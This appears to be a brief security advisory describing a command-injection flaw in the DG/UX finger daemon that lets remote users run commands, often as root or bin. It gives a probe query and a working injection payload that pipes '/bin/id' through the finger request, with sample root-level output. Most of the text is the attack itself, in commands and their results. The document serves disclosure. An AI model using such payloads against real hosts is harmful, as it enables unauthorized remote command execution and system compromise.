The finger daemon that ships with dgux will allow a remote user to pipe
commands, often with uid root or bin.

To check for this vulnerability, simply use the RFC compliant syntax;

finger /W@host

If it returns something like this, it may be vulnerable;

Login name: /W                          In real life: ???

To see the uid in.fingerd is running as, try this;

finger "|/bin/id@host"

Often, you will see something like this;

uid=0(root) gid=0(root)

or;

uid=2(bin) gid=2(bin) groups=2(bin),3(sys),5(mail)
